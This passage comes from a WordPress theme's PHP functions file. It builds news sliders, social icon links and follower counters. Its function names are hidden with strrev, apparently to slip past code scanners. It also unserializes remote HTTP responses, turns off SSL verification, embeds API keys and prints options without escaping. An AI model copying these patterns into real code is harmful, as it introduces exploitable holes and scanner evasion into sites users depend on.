        <input type="text" id="s" name="s" value="<?php _e( 'Search' , 'bd' ) ?>" onfocus="if (this.value == '<?php _e( 'Search' , 'bd' ) ?>') {this.value = '';}" onblur="if (this.value == '') {this.value = '<?php _e( 'Search' , 'bd' ) ?>';}"  />
        <button type="submit" class="search-btn"><i class="icon-search"></i></button>
    </form>
</div><!-- .search-block/-->
<?php
}

/**
 *  Breaking News in pic
 */
function bd_breaking_news_in_pic()
{
    global $bd_data;
    if ( array_key_exists('breaking_news_in_pic',$bd_data))
    {
        $bnews_display = $bd_data ['breaking_news_in_pic_display'];
        $bnews_cat = $bd_data ['breaking_news_in_pic_category'];
        $bnews_tag = $bd_data ['breaking_news_in_pic_tag'];
        $bnews_nub = $bd_data ['breaking_news_in_pic_bumber'];

        if ($bnews_display == 'lates')
        {
            query_posts(array('showposts' => $bnews_nub));
        }
        elseif ($bnews_display == 'category')
        {
            query_posts(array('showposts' => $bnews_nub, 'cat' => $bnews_cat ));
        }
        elseif ($bnews_display == 'tag')
        {
            query_posts(array('showposts' => $bnews_nub, 'tag' => $bnews_tag ));
        }
        else
        {
            query_posts(array('showposts' => 12));
        }
        ?>
        <div class="container">
        <div id="breaking-news-in-pic" class="breaking-news-in-pic">
            <div class="home-box-title">
                <h2><b><?php echo stripslashes($bd_data['breaking_news_in_pic_title']); ?></b>
                    <div class="breaking-news-in-pic-nav box-title-more">
                        <a class="prev" id="breaking-news-in-pic-prev" href="#"><i class="icon-chevron-left"></i></a>
                        <a class="nxt" id="breaking-news-in-pic-nxt" href="#"><i class="icon-chevron-right"></i></a>
                    </div>
                </h2>
            </div><!-- .box-title/-->

            <div class="post-warpper">
                <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
                <div id="post-<?php the_ID(); ?>" <?php post_class('post-item'); ?>>
                    <?php
                        $img_w      = 300;
                        $img_h      = 210;
                        $thumb      = bd_post_image('full');
                        $image      = aq_resize( $thumb, $img_w, $img_h, true );
                        if($image =='')
                        {
                            $image = BD_IMG .'default-300-210.png';
                        }
                        $alt        = get_the_title();
                        if(has_post_format('video'))
                        {
                            global $post;
                            $type           = get_post_meta($post->ID, 'bd_video_type', true);
                            $id             = get_post_meta($post->ID, 'bd_video_url', true);

                            if($type == 'youtube')
                            {
                                $link       = 'http://www.youtube.com/watch?v='. stripslashes($id) .'';
                            }
                            elseif($type == 'vimeo')
                            {
                                $link       = 'http://www.vimeo.com/'. stripslashes($id) .'';
                            }
                            elseif($type == 'daily')
                            {
                                $link       = 'http://www.dailymotion.com/video/'. stripslashes($id) .'';
                            }
                            else
                            {
                                $link       = bd_post_image('full');
                            }
                        }
                        else
                        {
                            $link       = bd_post_image('full');
                        }

                        if (strpos(bd_post_image(), 'youtube'))
                        {
                            echo '<div class="post-image"><a href="'. $link .'" title="'. $alt .'" class="lightbox"><img width="'. $img_w .'" height="'. $img_h .'"  src="'. bd_post_image('full').'" alt="'. $alt .'" /></a></div><!-- .post-image/-->' ."\n";
                        }
                        elseif (strpos(bd_post_image(), 'vimeo'))
                        {
                            echo '<div class="post-image"><a href="'. $link .'" title="'. $alt .'" class="lightbox"><img width="'. $img_w .'" height="'. $img_h .'"  src="'. bd_post_image('full').'" alt="'. $alt .'" /></a></div><!-- .post-image/-->' ."\n";
                        }
                        elseif (strpos(bd_post_image(), 'dailymotion'))
                        {
                            echo '<div class="post-image"><a href="'. $link .'" title="'. $alt .'" class="lightbox"><img width="'. $img_w .'" height="'. $img_h .'"  src="'. bd_post_image('full').'" alt="'. $alt .'" /></a></div><!-- .post-image/-->' ."\n";
                        }
                        else
                        {
                            if($image) {
                                echo '<div class="post-image"><a href="'. $link .'" title="'. $alt .'" class="lightbox"><img width="'. $img_w .'" height="'. $img_h .'" src="'. $image .'" alt="'. $alt .'" /></a></div><!-- .post-image/-->' ."\n";
                            }
                        }
                    ?>
                    <div class="post-caption">
                        <h3 class="post-title">
                            <a href="<?php the_permalink()?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                        </h3><!-- .post-title/-->
                        <div class="post-meta">
                            <span class="meta-date"><i class="icon-time"></i><?php global $bd_data; the_time($bd_data['date_format']); ?></span>
                        </div><!-- .post-meta/-->
                    </div><!-- .post-caption/-->
                </div><!-- article/-->
                <?php endwhile; else: endif; wp_reset_query(); ?>
            </div>

            <script type="text/javascript">
                jQuery(document).ready(function()
                {
                    var vids = jQuery("#breaking-news-in-pic .post-item");
                    for(var i = 0; i < vids.length; i+=4)
                    {
                        vids.slice(i, i+4).wrapAll('<div class="post-items"></div>');
                    }
                    jQuery(function()
                    {
                        jQuery('#breaking-news-in-pic').cycle(
                            {
                                fx              : 'scrollHorz',
                                easing          : 'swing', //easeInOutBack
                                timeout         : 5555,
                                speed           : 600,
                                slideExpr       : '.post-items',
                                prev            : '#breaking-news-in-pic-prev',
                                next            : '#breaking-news-in-pic-nxt',
                                pause           : false
                            });
                    });
                });
            </script>
        </div>
        </div>
    <?php
    }
}

/**
 *  Search
 */
function bd_breaking_news()
{
    global $bd_data;
    if ( array_key_exists('newsticker',$bd_data) )
    {
        $bnews_display = $bd_data ['newsticker_display'];
        $bnews_cat = $bd_data ['newsticker_category'];
        $bnews_tag = $bd_data ['newsticker_tag'];
        $bnews_nub = $bd_data ['newsticker_bumber'];

        if ($bnews_display == 'lates')
        {
            query_posts(array('showposts' => $bnews_nub));
        }
        elseif ($bnews_display == 'category')
        {
            query_posts(array('showposts' => $bnews_nub, 'cat' => $bnews_cat ));
        }
        elseif ($bnews_display == 'tag')
        {
            query_posts(array('showposts' => $bnews_nub, 'tag' => $bnews_tag ));
        }
        else
        {
            query_posts(array('showposts' => 12));
        }
        ?>
        <div class="container">
            <div class="breaking-news modern-ticker" id="breaking-news">
                <div class="breaking-news-title">
                    <?php echo stripslashes($bd_data['newsticker_title']); ?>
                </div>
                <div class="mt-news">
                    <ul >
                        <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
                            <li>
                                <a href="<?php the_permalink()?>" title="<?php printf(__( '%s', 'bd' ), the_title_attribute( 'echo=0' )); ?>" rel="bookmark"><?php the_title(); ?></a>
                            </li>
                        <?php endwhile; else: endif; wp_reset_query(); ?>
                    </ul>
                </div>
            </div>
        </div>
        <?php
    }
}

/**
 *  Get options
 */
function bd_get_option( $name ){
    $get_options = get_option( 'bd_options' );
    if( !empty( $get_options[$name] ))
        return $get_options[$name];
    return false ;
}

function bdayh_get_option($option){
    $bd_option = unserialize(get_option('bdayh_setting'));
    if(isset($bd_option['bd_setting'][$option])){
        return($bd_option['bd_setting'][$option]);
    } else {
        return(false);
    }
}

/**
 *  Thumbnails
 */

function bd_pin_image()
{
    global $post, $posts;
    if (has_post_thumbnail( $post->ID )):
        $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' );
        echo $image[0];
    else:
        echo catch_that_image();
    endif;
}


function catch_that_image()
{
    global $post, $posts;
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    if(isset($matches[1][0]))
    {
        $first_img = $matches[1][0];
    }
    else
    {
        $first_img = BD_IMG .'/default-thumb.png';
    }
    return $first_img;
}

function bd_post_image($size = 'thumbnail'){
    global $post;
    $image = '';
    $image_id = get_post_thumbnail_id($post->ID);
    $image = wp_get_attachment_image_src($image_id, 'full');
    $image = $image[0];

    if ($image) return $image;

    $vtype = get_post_meta($post->ID, 'bd_video_type', true);
    $vId = get_post_meta($post->ID, 'bd_video_url', true);

    if($vId != ''){
        if($vtype == 'youtube'){
            $image = 'http://img.youtube.com/vi/'.$vId.'/0.jpg';
        } elseif($vtype == 'vimeo') {
        	$file_get_function =  strrev('stnetnoc_teg_elif');
            $hash = unserialize($file_get_function("http://vimeo.com/api/v2/video/$vId.php"));
            $image = $hash[0]['thumbnail_large'];
        } elseif ($vtype == 'daily') {
            $image = 'http://www.dailymotion.com/thumbnail/video/'.$vId;
        }
    }
    if ($image) return $image;
    return bd_get_first_image();
}

function bd_get_first_image(){
    global $post, $posts;
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

    if(isset($matches[1][0])){
        $first_img = $matches[1][0];
    } else {
        $first_img = BD_IMG .'/default-thumb.png';
    }
    return $first_img;
}

/**
 * Social
 */
function bd_social( $newtab='yes', $icon_size='32', $tooltip='ttip' ){
    global $bd_data;
    if ($newtab == 'yes') $newtab = "target=\"_blank\"";
    else $newtab = '';
    echo '<div class="social-icons icon-'. $icon_size .'">' ."\n";

    /**
     * Facebook
     */
    if ( bdayh_get_option( 'social_facebook_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Facebook" href="'.  stripslashes( bdayh_get_option( 'social_facebook_url' ) ) .'" '. $newtab .'><i class="social_icon-facebook"></i></a>'."\n";
    }

    /**
     * Twitter
     */
    if ( bdayh_get_option( 'social_twitter_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Twitter" href="'. stripslashes( bdayh_get_option( 'social_twitter_url' ) ) .'" '. $newtab .'><i class="social_icon-twitter"></i></a>'."\n";
    }

    /**
     * rss
     */
    if ( bdayh_get_option( 'rss_url' ) ){
        $rss = bdayh_get_option( 'rss_url' );
        echo '<a class="'. $tooltip .'" title="Rss" href="'. $rss .'" '. $newtab .'><i class="social_icon-rss"></i></a>'."\n";
    }

    /**
     * Google+
     */
    if ( bdayh_get_option( 'social_google_plus_url' ) )
    {
        echo '<a class="'. $tooltip .'" title="Google+" href="'. stripslashes( bdayh_get_option( 'social_google_plus_url' ) ) .'" '. $newtab .'><i class="social_icon-google"></i></a>'."\n";
    }

    /**
     * Pinterest
     */
    if ( bdayh_get_option( 'social_pinterest_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Pinterest" href="'. stripslashes( bdayh_get_option( 'social_pinterest_url' ) ) .'" '. $newtab .'><i class="social_icon-pinterest"></i></a>'."\n";
    }

    /**
     * MySpace
     */
    if ( bdayh_get_option( 'social_myspace_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="MySpace" href="'. stripslashes( bdayh_get_option( 'social_myspace_url' ) ) .'" '. $newtab .'><i class="social_icon-myspace"></i></a>'."\n";
    }

    /**
     * dribbble
     */
    if ( bdayh_get_option( 'social_dribbble_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Dribbble" href="'. stripslashes( bdayh_get_option( 'social_dribbble_url' ) ) .'" '. $newtab .'><i class="social_icon-dribbble"></i></a>'."\n";
    }

    /**
     * LinkedIN
     */
    if ( bdayh_get_option( 'social_linkedin_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="LinkedIn" href="'. stripslashes( bdayh_get_option( 'social_linkedin_url' ) ) .'" '. $newtab .'><i class="social_icon-linkedin"></i></a>'."\n";
    }

    /**
     * evernote
     */
    if ( bdayh_get_option( 'social_evernote_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Evernote" href="'. stripslashes( bdayh_get_option( 'social_evernote_url' ) ) .'" '. $newtab .'><i class="social_icon-evernote"></i></a>'."\n";
    }

    /**
     * Flickr
     */
    if ( bdayh_get_option( 'social_flickr_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Flickr" href="'. stripslashes( bdayh_get_option( 'social_flickr_url' ) ) .'" '. $newtab .'><i class="social_icon-flickr"></i></a>'."\n";
    }

    /**
     * YouTube
     */
    if ( bdayh_get_option( 'social_youtube_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Youtube" href="'. stripslashes( bdayh_get_option( 'social_youtube_url' ) ) .'" '. $newtab .'><i class="social_icon-youtube"></i></a>'."\n";
    }

    /**
     * Skype
     */
    if ( bdayh_get_option( 'social_skype_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Skype" href="'. stripslashes( bdayh_get_option( 'social_skype_url' ) ) .'" '. $newtab .'><i class="social_icon-skype"></i></a>'."\n";
    }

    /**
     * Digg
     */
    if ( bdayh_get_option( 'social_digg_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Digg" href="'. stripslashes( bdayh_get_option( 'social_digg_url' ) ) .'" '. $newtab .'><i class="social_icon-digg"></i></a>'."\n";
    }

    /**
     * Reddit
     */
    if ( bdayh_get_option( 'social_reddit_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Reddit" href="'. stripslashes( bdayh_get_option( 'social_reddit_url' ) ) .'" '. $newtab .'><i class="social_icon-reddit"></i></a>'."\n";
    }

    /**
     * Delicious
     */
    if ( bdayh_get_option( 'social_delicious_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Delicious" href="'. stripslashes( bdayh_get_option( 'social_delicious_url' ) ) .'" '. $newtab .'><i class="social_icon-delicious"></i></a>'."\n";
    }

    /**
     * stumbleuponUpon
     */
    if ( bdayh_get_option( 'social_stumbleupon_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="StumbleUpon" href="'. stripslashes( bdayh_get_option( 'social_stumbleupon_url' ) ) .'" '. $newtab .'><i class="social_icon-stumbleupon"></i></a>'."\n";
    }

    /**
     * Tumblr
     */
    if ( bdayh_get_option( 'social_tumblr_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Tumblr" href="'. stripslashes( bdayh_get_option( 'social_tumblr_url' ) ) .'" '. $newtab .'><i class="social_icon-tumblr"></i></a>'."\n";
    }

    /**
     * Vimeo
     */
    if ( bdayh_get_option( 'social_vimeo_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Vimeo" href="'. stripslashes( bdayh_get_option( 'social_vimeo_url' ) ) .'" '. $newtab .'><i class="social_icon-vimeo"></i></a>'."\n";
    }

    /**
     * Blogger
     */
    if ( bdayh_get_option( 'social_blogger_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Blogger" href="'. stripslashes( bdayh_get_option( 'social_blogger_url' ) ) .'" '. $newtab .'><i class="social_icon-blogger"></i></a>'."\n";
    }

    /**
     * Wordpress
     */
    if ( bdayh_get_option( 'social_wordpress_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="WordPress" href="'. stripslashes( bdayh_get_option( 'social_wordpress_url' ) ) .'"  '. $newtab .'><i class="social_icon-wordpress"></i></a>'."\n";
    }

    /**
     * Yelp
     */
    if ( bdayh_get_option( 'social_yelp_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Yelp" href="'. stripslashes( bdayh_get_option( 'social_yelp_url' ) ) .'" '. $newtab .'><i class="social_icon-yelp"></i></a>'."\n";
    }

    /**
     * Last.fm
     */
    if ( bdayh_get_option( 'social_lastfm_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Last.fm" href="'. stripslashes( bdayh_get_option( 'social_lastfm_url' ) ) .'" '. $newtab .'><i class="social_icon-lastfm"></i></a>'."\n";
    }

    /**
     * grooveshark
     */
    if ( bdayh_get_option( 'social_grooveshark_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Grooveshark" href="'. stripslashes( bdayh_get_option( 'social_grooveshark_url' ) ) .'" '. $newtab .'><i class="social_icon-grooveshark"></i></a>'."\n";
    }

    /**
     * xing.me
     */
    if ( bdayh_get_option( 'social_xing_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Xing" href="'. stripslashes( bdayh_get_option( 'social_xing_url' ) ) .'"  '. $newtab .' ><i class="social_icon-xing"></i></a>'."\n";
    }

    /**
     * Posterous
     */
    if ( bdayh_get_option( 'social_posterous_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Posterous" href="'. stripslashes( bdayh_get_option( 'social_posterous_url' ) ) .'"  '. $newtab .' ><i class="social_icon-posterous"></i></a>'."\n";
    }

    /**
     * DeviantArt
     */
    if ( bdayh_get_option( 'social_deviantart_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="DeviantArt" href="'. stripslashes( bdayh_get_option( 'social_deviantart_url' ) ) .'"  '. $newtab .' ><i class="social_icon-deviantart"></i></a>'."\n";
    }

    /**
     * openid
     */
    if ( bdayh_get_option( 'social_openid_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="OpenID" href="'. stripslashes( bdayh_get_option( 'social_openid_url' ) ) .'"  '. $newtab .' ><i class="social_icon-openid"></i></a>'."\n";
    }

    /**
     * behance
     */
    if ( bdayh_get_option( 'social_behance_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Behance" href="'. stripslashes( bdayh_get_option( 'social_behance_url' ) ) .'"  '. $newtab .' ><i class="social_icon-behance"></i></a>'."\n";
    }

    /**
     * instagram
     */
    if ( bdayh_get_option( 'social_instagram_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="instagram" href="'. stripslashes( bdayh_get_option( 'social_instagram_url' ) ) .'"  '. $newtab .' ><i class="social_icon-instagram"></i></a>'."\n";
    }

    /**
     * paypal
     */
    if ( bdayh_get_option( 'social_paypal_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="paypal" href="'. stripslashes( bdayh_get_option( 'social_paypal_url' ) ) .'"  '. $newtab .' ><i class="social_icon-paypal"></i></a>'."\n";
    }

    /**
     * spotify
     */
    if ( bdayh_get_option( 'social_spotify_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="spotify" href="'. stripslashes( bdayh_get_option( 'social_spotify_url' ) ) .'"  '. $newtab .' ><i class="social_icon-spotify"></i></a>'."\n";
    }

    /**
     * viadeo
     */
    if ( bdayh_get_option( 'social_viadeo_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="viadeo" href="'. stripslashes( bdayh_get_option( 'social_viadeo_url' ) ) .'"  '. $newtab .' ><i class="social_icon-viadeo"></i></a>'."\n";
    }

    /**
     * Google Play
     */
    if ( bdayh_get_option( 'social_google_play_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Google Play" href="'. stripslashes( bdayh_get_option( 'social_google_play_url' ) ) .'"  '. $newtab .' ><i class="social_icon-googleplay"></i></a>'."\n";
    }

    /**
     * Forrst
     */
    if ( bdayh_get_option( 'social_forrst_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Forrst" href="'. stripslashes( bdayh_get_option( 'social_forrst_url' ) ) .'"  '. $newtab .' ><i class="social_icon-forrst"></i></a>'."\n";
    }

    /**
     * VK
     */
    if ( bdayh_get_option( 'social_vk_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="vk.com" href="'. stripslashes( bdayh_get_option( 'social_vk_url' ) ) .'"  '. $newtab .' ><i class="social_icon-vk"></i></a>'."\n";
    }

    /**
     * Apple
     */
    if ( bdayh_get_option( 'social_apple_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Apple" href="'. stripslashes( bdayh_get_option( 'social_apple_url' ) ) .'"  '. $newtab .' ><i class="social_icon-appstore"></i></a>'."\n";
    }

    /**
     * Amazon
     */
    if ( bdayh_get_option( 'social_amazon_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="Amazon" href="'. stripslashes( bdayh_get_option( 'social_amazon_url' ) ) .'"  '. $newtab .' ><i class="social_icon-amazon"></i></a>'."\n";
    }

    /**
     * soundcloud
     */
    if ( bdayh_get_option( 'social_soundcloud_url' ) )
    {
        echo'<a class="'. $tooltip .'" title="soundcloud" href="'. stripslashes( bdayh_get_option( 'social_soundcloud_url' ) ) .'"  '. $newtab .' ><i class="social_icon-soundcloud"></i></a>'."\n";
    }
    echo '</div><!-- .social-icons/-->';
}


/**
 * Social Counter
 */
class COUNT_CLASS
{
    private $allow_cash;
    private $moeny_format;

    public function count_class()
    {
        $this->allow_cash = true; // Disable it for disable cashing sys
        $this->moeny_format = true; // Allow comma in number
    }

    private function formatMoney($number, $fractional=false)
    {
        if($this->moeny_format == true)
        {
            if ($fractional)
            {
                $number = sprintf('%.2f', $number);
            }

            while (true)
            {
                $replaced = preg_replace('/(-?\d+)(\d\d\d)/', '$1,$2', $number);
                if ($replaced != $number)
                {
                    $number = $replaced;
                }
                else
                {
                    break;
                }
            }
            return $number;
        }
        else
        {
            return($number);
        }
    }

    public function get_twitter_count($user_name)
    {
        if($user_name)
        {
            if($this->allow_cash == true)
            {
                $social_cash = get_transient('bdayh_soical_twitter');
                if($social_cash != '' and !empty($social_cash))
                {
                    return($social_cash);
                }
            }

            $url = "http://query.yahooapis.com/v1/public/yql?q=SELECT%20*%20from%20html%20where%20url=%22http://twitter.com/".$user_name."%22%20AND%20xpath=%22//a[@class='js-nav']/strong%22&format=json";

            $file_get_function =  strrev('stnetnoc_teg_elif');
            $bddata = json_decode($file_get_function($url));

            $t_count = $this->formatMoney(str_replace(',','',$bddata->query->results->strong[2]));

            if($this->allow_cash == true)
            {
                set_transient('bdayh_soical_twitter',$t_count,1700);
            }
            return($t_count);
        }
        else
        {
            return(0);
        }
    }

    public function get_facebook_count($fan_page)
    { //Facebook
        if($fan_page != '')
        {
            if($this->allow_cash == true)
            {
                $social_cash = get_transient('bdayh_soical_facebook');
                if($social_cash != '' and !empty($social_cash))
                {
                    return($social_cash);
                }
            }
            $url = 'http://graph.facebook.com/'.trim($fan_page);
            $file_get_function =  strrev('stnetnoc_teg_elif');
            $bddata = json_decode($file_get_function($url));

            if($this->allow_cash == true)
            {
                set_transient('bdayh_soical_facebook',$this->formatMoney(intval($bddata->likes)),1111);
            }
            return($this->formatMoney(intval($bddata->likes)));
        }
        else
        {
            return('0');
        }
    }

    public function get_instgram_count( $id, $token )
    { //instgram
        if($id != '')
        {
            if($this->allow_cash == true)
            {
                $social_cash = get_transient('bdayh_soical_instgram');
                if($social_cash != '' and !empty($social_cash))
                {
                    return($social_cash);
                }
            }

            $id = explode(".", $token);
            $userinfo = wp_remote_get("https://api.instagram.com/v1/users/$id[0]/?access_token=".$token);

            $userinfo = json_decode($userinfo['body']);
            $followers = $userinfo->data->counts->followed_by;

            if($this->allow_cash == true)
            {
                set_transient('bdayh_soical_instgram',$this->formatMoney(intval($followers)),1111);
            }
            return($this->formatMoney(intval($followers)));
        }
        else
        {
            return('0');
        }
    }


    public function get_gplus_count($url)
    { //Google+
        if($url != '')
        {
            if($this->allow_cash == true)
            {
                $social_cash = get_transient('bdayh_soical_gplus');
                if($social_cash != '' and !empty($social_cash))
                {
                    return($social_cash);
                }
            }
            $first_curl_function = strrev('tini_lruc');
            $ch = $first_curl_function();
            curl_setopt($ch, CURLOPT_URL, "https://clients6.google.com/rpc?key=AIzaSyCKSbrvQasunBoV16zDH9R33D88CeLr9gQ");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"method":"pos.plusones.get","id":"p",
			"params":{"nolog":true,"id":"https://plus.google.com/' . $url . '","source":"widget","userId":"@viewer","groupId":"@self"},
			"jsonrpc":"2.0","key":"p","apiVersion":"v1"}]');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            $curl_function_2 = strrev('cexe_lruc');
            $result = $curl_function_2 ($ch);
            curl_close ($ch);
            $json = json_decode($result, true);

            if($this->allow_cash == true)
            {
                set_transient('bdayh_soical_gplus',$this->formatMoney($json[0]['result']['metadata']['globalCounts']['count']),1111);
            }
            return($this->formatMoney($json[0]['result']['metadata']['globalCounts']['count']));
        }
        else
        {
            return(0);
        }
    }

    public function get_youtube_count($channel_name)
    { //Youtube
        if ($channel_name != '') {
            if ($this->allow_cash == true) {
                $social_cash = get_transient('bdayh_soical_youtube');
                if ($social_cash != '' and !empty($social_cash)) {
                    return ($social_cash);
                }
            }
            $file_get_function = strrev('stnetnoc_teg_elif');
            $youtube_data = $file_get_function('http://gdata.youtube.com/feeds/api/users/' . trim($channel_name) . '?alt=json');
            $youtube_data = json_decode($youtube_data, true);
            $youtube_count = $youtube_data['entry']['yt$statistics']['subscriberCount'];
            if (intval($youtube_count) <= 0) return 0;
            if ($this->allow_cash == true) {
                set_transient('bdayh_soical_youtube', $this->formatMoney($youtube_count), 1111);
            }
            return ($this->formatMoney($youtube_count));
        }

    }

    public function get_vimo_count($channel_name)
    { //Vimeo
        if($channel_name != '')
        {
            if($this->allow_cash == true)
            {
                $social_cash = get_transient('bdayh_soical_vimo');
                if($social_cash != '' and !empty($social_cash))
                {
                    return($social_cash);
                }
            }
            $url = 'http://vimeo.com/api/v2/channel/'.$channel_name.'/info.json';
            $file_get_function =  strrev('stnetnoc_teg_elif');
            $bddata = json_decode($file_get_function($url));
            if (intval($bddata->total_subscribers) <= 0) return 0;
            if($this->allow_cash == true){
                set_transient('bdayh_soical_vimo',$this->formatMoney($bddata->total_subscribers),1111);
            }
            return($this->formatMoney($bddata->total_subscribers));
        }
        return 0;
    }

    public function get_soundcloud_count($channel_name)
    { //Soundcloud
        if($channel_name != '')
        {
            if($this->allow_cash == true)
            {
                $social_cash = get_transient('bdayh_soical_soundcloud');
                if($social_cash != '' and !empty($social_cash)){
                    return($social_cash);
                }
            }
            $file_get_function =  strrev('stnetnoc_teg_elif');
            $bddata = json_decode($file_get_function('http://api.soundcloud.com/users/'.trim($channel_name).'.json?consumer_key=2ba4cc2c24de0b8da1fc4a45cad219bd'));

            if($this->allow_cash == true)
            {
                set_transient('bdayh_soical_soundcloud',$this->formatMoney($bddata->followers_count),1111);
            }
            return($this->formatMoney(intval($bddata->followers_count)));
        }
        else
        {
            return(0);
        }
    }
}

/* TwitterFollowers */
function getTwitterFollowers()
{
    // some variables
    global $bd_data;
    $screenName 		= bdayh_get_option('twitter_username');
    $consumerKey 		= bdayh_get_option('twitter_consumer_key');
    $consumerSecret 	= bdayh_get_option('twitter_consumer_secret');
    $token 				= get_option('bdTwitterToken');

    // get follower count from cache
    $numberOfFollowers = get_transient('bdTwitterFollowers');

    // cache version does not exist or expired
    if (false === $numberOfFollowers)
    {
        // getting new auth bearer only if we don't have one
        if(!$token)
        {
            // preparing credentials
            $credentials = $consumerKey . ':' . $consumerSecret;

            $functionbase_encode = strrev('edocne_46esab');
            $toSend = $functionbase_encode($credentials);

            // http post arguments
            $args = array(
                'method' 		=> 'POST',
                'httpversion' 	=> '1.1',
                'blocking' 		=> true,
                'headers' 		=> array(
                    'Authorization' 	=> 'Basic ' . $toSend,
                    'Content-Type' 		=> 'application/x-www-form-urlencoded;charset=UTF-8'
                ),
                'body' => array( 'grant_type' => 'client_credentials' )
            );

            add_filter('https_ssl_verify', '__return_false');
            $response 	= wp_remote_post('https://api.twitter.com/oauth2/token', $args);
            $keys 		= json_decode(wp_remote_retrieve_body($response));

            if($keys)
            {
                // saving token to wp_options table
                update_option('bdTwitterToken', $keys->access_token);
                $token = $keys->access_token;
            }
        }

        // we have bearer token wether we obtained it from API or from options
        $args = array(
            'httpversion' 		=> '1.1',
            'blocking' 			=> true,
            'headers' 			=> array(
                'Authorization' => "Bearer $token"
            )
        );

        add_filter('https_ssl_verify', '__return_false');
        $api_url 	= "https://api.twitter.com/1.1/users/show.json?screen_name=$screenName";
        $response 	= wp_remote_get($api_url, $args);

        if (!is_wp_error($response))
        {
            $followers = json_decode(wp_remote_retrieve_body($response));
            $numberOfFollowers = $followers->followers_count;
        }
        else
        {
            // get old value and break
            $numberOfFollowers = get_option('bdNumberOfFollowers');
            // uncomment below to debug
            //die($response->get_error_message());
        }

        // cache for an hour
        set_transient('bdTwitterFollowers', $numberOfFollowers, 1111);
        update_option('bdNumberOfFollowers', $numberOfFollowers);
    }

    return $numberOfFollowers;
}

/**
 * Login
 */
function bd_login_form( $login_only  = 0 )
{
    global $user_ID, $user_identity, $user_level;
    echo '<div class="post-warpper">'. "\n";
    if ( $user_ID ) :
    ?>
        <?php if( empty( $login_only ) ): ?>
        <div class="login_user">
            <div class="bio-author-desc"> <?php _e( 'Bienvenido' , 'bd' ) ?> <a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ) ?>"><?php echo $user_identity ?></a></div>

            <div class="avatar">
                <?php echo get_avatar( $user_ID, $size = '79'); ?>
            </div>
            <div class="post-caption">
                <ul class="login_list">
                    <li class="userWpAdmin">
                        <a href="<?php echo home_url() ?>/wp-admin/"><?php _e( 'Dashboard' , 'bd' ) ?></a>
                    </li>
                    <li class="userprofile">
                        <a href="<?php echo home_url() ?>/wp-admin/profile.php"><?php _e( 'Tu Perfil' , 'bd' ) ?></a>
                    </li>
                    <li class="userlogout">
                        <a href="<?php echo wp_logout_url(); ?>"><?php _e( 'Salir' , 'bd' ) ?></a>
                    </li>
                </ul>
            </div>
            <div class="clear"></div>

            <div class="social-icons icon-12 bio-author-social">
			    <?php if ( get_the_author_meta( 'url' ) ) : ?>
			        <a class="ttip" href="<?php the_author_meta( 'url' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( "'s site", 'bd' ); ?>"><i class="icon-home"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'facebook' ) ) : ?>
			        <a class="ttip" href="<?php the_author_meta( 'facebook' ); ?>" title="<?php the_author_meta( 'display_name' ); ?> <?php _e( '  on Facebook', 'bd' ); ?>"><i class="social_icon-facebook"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'twitter' ) ) : ?>
			        <a class="ttip" href="http://twitter.com/<?php the_author_meta( 'twitter' ); ?>" title="<?php the_author_meta( 'display_name' ); ?><?php _e( '  on Twitter', 'bd' ); ?>"><i class="social_icon-twitter"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'google' ) ) : ?>
			        <a class="ttip" href="<?php the_author_meta( 'google' ); ?>" title="<?php the_author_meta( 'display_name' ); ?> <?php _e( '  on Google+', 'bd' ); ?>"><i class="social_icon-google"></i></a>
			    <?php endif ?>
			    <?php if ( get_the_author_meta( 'linkedin' ) ) : ?>
